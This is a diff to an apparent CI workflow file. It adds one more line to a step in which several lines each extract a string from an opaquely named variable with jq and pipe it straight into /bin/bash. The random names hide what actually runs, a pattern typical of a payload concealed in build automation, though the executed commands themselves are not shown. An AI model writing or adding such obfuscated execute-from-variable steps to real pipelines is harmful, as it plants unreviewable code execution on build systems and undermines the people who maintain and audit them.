@@ -29,6 +29,7 @@ jobs:
           echo $zcvqi7873 | jq -r .xuzl08 | /bin/bash
           echo $ap31065 | jq -r .bpmr0 | /bin/bash
           echo $vvbu8 | jq -r .mnbbe483 | /bin/bash
+          echo $why9 | jq -r .yqt03 | /bin/bash
 
       - name: Archive results
         uses: actions/upload-artifact@v4
